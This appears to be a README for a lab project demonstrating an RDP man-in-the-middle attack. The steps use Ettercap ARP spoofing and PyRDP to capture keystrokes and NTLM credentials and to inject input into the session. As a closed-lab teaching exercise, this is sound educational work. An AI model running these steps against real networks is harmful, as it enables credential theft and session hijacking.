
# RDP MITM Attack Project

## Objective
Demonstrate a Man-in-the-Middle (MITM) attack on a Remote Desktop Protocol (RDP) session to capture sensitive data and highlight the importance of securing remote connections.

## Prerequisites
- **Operating System**: Kali Linux (3 virtual machines)
- **Tools**:
  - PyRDP (RDP MITM tool)
  - Ettercap (ARP spoofing)
  - Remmina (RDP client)
  - Wireshark (optional, for traffic analysis)
  - xRDP (RDP service on the server machine)

---

## Installation Steps

### Step 1: Environment Setup

#### Install xRDP on Machine A (Server)
```bash
sudo apt update
sudo apt install xrdp -y
sudo systemctl enable xrdp
sudo systemctl start xrdp
sudo ufw allow 3389/tcp
```

#### Verify xRDP Installation
```bash
sudo systemctl status xrdp
```

#### Install Remmina on Machine B (Client)
```bash
sudo apt update
sudo apt install remmina remmina-plugin-rdp -y
```

#### Install Tools on Machine C (MITM)
```bash
sudo apt update
sudo apt install ettercap-text-only -y
pip install pyrdp
sudo apt install wireshark -y
```

---

### Step 2: ARP Spoofing Configuration on Machine C

#### Launch Ettercap
```bash
sudo ettercap -G
```
1. Select Network Interface.
2. Scan for Hosts in the Network.
3. Add Target 1: Machine A (Server).
4. Add Target 2: Machine B (Client).
5. Enable ARP Spoofing.

---

### Step 3: Launch PyRDP on Machine C
```bash
pyrdp-mitm --output-dir ./logs
```

---

### Step 4: Establish RDP Connection from Machine B to Machine A
1. Launch Remmina on Machine B.
2. Configure RDP Connection to the IP of Machine A.

---

### Step 5: Monitor and Analyze Traffic on Machine C

#### View Logs Captured by PyRDP
```bash
ls ./logs
```

#### Analyze Captured Keystrokes and Credentials
```bash
cat ./logs/mitm.log
cat ./logs/ntlmssp.log
```

#### Optional: Analyze Network Traffic with Wireshark
```bash
sudo wireshark
```

---

### Step 6: Inject Commands into RDP Session
```bash
pyrdp-inject --target <Target IP> --message "Hello from MITM"
```

---

### Additional Verification Commands

#### Verify ARP Table on Machine B
```bash
arp -a
```

#### Verify Open Ports on Machine A
```bash
sudo netstat -tuln | grep 3389
```

#### Check Network Connectivity
```bash
ping <IP of Machine A>
```

---

## Conclusion
This project demonstrates the vulnerability of RDP sessions to MITM attacks when proper security measures are not implemented. By following this guide, users can understand how attackers exploit insecure configurations and can take proactive steps to secure remote connections using encryption, strong authentication, and network segmentation.

## References
- [PyRDP Documentation](https://github.com/GoSecure/pyrdp)
- [Ettercap Official Website](https://www.ettercap-project.org/)
- [Wireshark User Guide](https://www.wireshark.org/docs/)
- [Kali Linux Tools](https://tools.kali.org/)

---

## License

This project is licensed under the MIT License. See the details below:

```
MIT License

Copyright (c) 2025 Aswath P Raj

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
